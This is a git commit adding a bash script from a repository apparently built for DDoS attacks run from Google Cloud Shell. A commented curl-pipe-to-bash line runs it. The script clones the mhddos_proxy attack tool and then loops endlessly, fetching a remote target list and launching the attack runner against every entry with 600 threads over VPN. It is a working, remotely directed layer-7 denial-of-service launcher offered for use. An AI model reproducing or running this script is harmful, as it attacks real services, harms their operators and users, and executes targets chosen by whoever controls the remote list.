968fce9bace470b7c5159a35dfad5b6ef11f1db0
Operation-Stop-russia <103530329+Operation-Stop-russia@users.noreply.github.com>
2022-06-10 13:03:17 +0300

    Create L7_test_limit-dns-concurrency.sh

---
+++ L7_test_limit-dns-concurrency.sh
@@ -0,0 +1,29 @@
+#!/bin/bash
+#curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L7_test_limit-dns-concurrency.sh | bash
+rm -rf mhddos_proxy
+git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy/tree/limit-dns-concurrency.git
+cd mhddos_proxy
+python3 -m pip install -r requirements.txt
+
+threads="-t 600"
+rpc=""
+debug=""
+vpn="--vpn"
+
+while true
+do
+   pkill -f runner.py
+   sleep 10
+   list_size=$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst | cat | grep "^[^#]" | wc -l)
+   while [[ $list_size = "0"  ]]
+      do
+            sleep 5
+            list_size=$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst | cat | grep "^[^#]" | wc -l)
+      done
+   for (( i=1; i<=list_size; i++ ))
+      do
+            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst | cat | grep "^[^#]")")
+            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $vpn $debug&
+      done
+sleep 19m
+done
